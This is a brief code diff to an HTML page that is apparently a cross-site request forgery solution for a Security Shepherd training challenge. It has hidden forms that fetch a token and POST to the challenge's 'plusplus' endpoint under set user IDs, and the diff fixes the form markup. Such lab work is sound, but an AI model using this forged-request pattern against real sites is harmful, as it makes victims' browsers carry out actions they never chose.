@@ -1,10 +1,10 @@
 <html>
     <body>
         <form name="token" action="https://security-shepherd.dev.inf.elasticnet.co/user/csrfchallengeseven/getToken" method="GET" target="tokenTarget">
-            <input type=""hidden" name="userId" value="ceb75022bc88977c7f9a3b41ac341a47cc99d33d" />
+            <input type="hidden" name="userId" value="ceb75022bc88977c7f9a3b41ac341a47cc99d33d" />
             <input type="submit"/>
         </form>
-        <iframe name="tokenTarget"></iframe>
+        <iframe name="tokenTarget" id="tokenTarget"></iframe>
 
         <form name="ff" action="https://security-shepherd.dev.inf.elasticnet.co/user/csrfchallengeseven/plusplus" method="POST">
             <input type="hidden" name="userId" value="d35874530d87a07ad3cd5864affdf5736743f5ad" />
